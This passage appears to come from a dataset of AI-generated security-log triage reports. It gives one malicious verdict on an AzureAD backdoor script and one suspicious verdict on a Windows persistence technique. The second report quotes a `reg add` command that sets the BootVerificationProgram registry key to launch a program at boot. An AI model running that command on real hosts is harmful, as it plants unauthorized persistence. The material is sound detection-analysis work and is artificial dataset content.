Given the analysis of the PowerShell and Sysmon logs, the behaviors observed are highly indicative of malicious activity. The script appears to be crafted for unauthorized access and persistence, possibly by creating a backdoor within the Windows host environment. Its actions such as certificate creation, connecting to AzureAD with a scripted authentication process, and processes executed under potentially elevated privileges further support this conclusion.

**Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment**: Isolate `Server002` from the network to prevent further unauthorized access and exfiltration.
2. **Detailed Investigation**: Conduct a deeper forensic analysis to determine the full scope of the compromise, including any other affected systems or accounts.
3. **Credentials Review**: Reset any potentially compromised credentials, particularly those related to AzureAD.
4. **Review and Enhance Security**: Audit and possibly enhance PowerShell logging, enforce stricter PowerShell execution policies, and review AzureAD policies to prevent similar incidents.
5. **Monitoring and Alerts**: Implement monitoring and alerting for similar activities in future to detect any attempts of unauthorized access.

By following these steps, the organization can mitigate the impact of this malicious activity and prevent future occurrences."
Creating Boot Verification Program Key for application execution during successful boot,"After reviewing the provided logs, the analysis indicates the following:

1. **Time Change Events**:
   - The system and security logs show multiple time change events (`EventID: 4616` in Security logs and `EventID: 24, 1` in System logs) where the new time is earlier than the previous time. This rollback of the system clock can be suspicious, especially if it is an intentional action. Often, changing the system time could be employed to counteract anti-virus or log management tools.

2. **Unusual Command Line Execution**:
   - The Sysmon logs show a command line execution via `cmd.exe` with the command: `reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\\Program Files\\Internet Explorer\\iexplore.exe""`. The use of `reg.exe` to alter registry keys, particularly `BootVerificationProgram`, is anomalous and indicative of malicious intent as it can modify boot processes.

3. **High Privilege Assignment**:
   - The security log (`Event ID: 4672`) indicates an account (`admin_test`) was assigned multiple high-level privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). While these can be legitimate, if not expected, this signals potential for misuse or preparation for privilege escalation.

4. **Network and Service Operations**:
   - Logs indicate system updates and operations with services like `MicrosoftEdgeUpdate.exe`. Most of these seem legitimate and part of the usual update process, yet the occurrence alongside other suspicious events fuels potential concern.

**Assessment**:
- There are clear indicators of suspicious or potentially malicious activity due to unauthorized time changes and the registry modifications being performed. The user `admin_test` executing sensitive commands is a red flag, especially in environments where such operations are tightly controlled.

**Resolution**:  
- **SUSPICIOUS**: The logs contain activities that don't look right and need more investigation. Recommend conducting further investigation on the context around the `admin_test` user’s actions, particularly investigating any recent administrative actions on the server and validation against policy violations. Also, review system integrity for unauthorized changes or accesses outside of this log slice. Additionally, monitoring and alerting for unusual account activity and changes to the system time should be implemented."
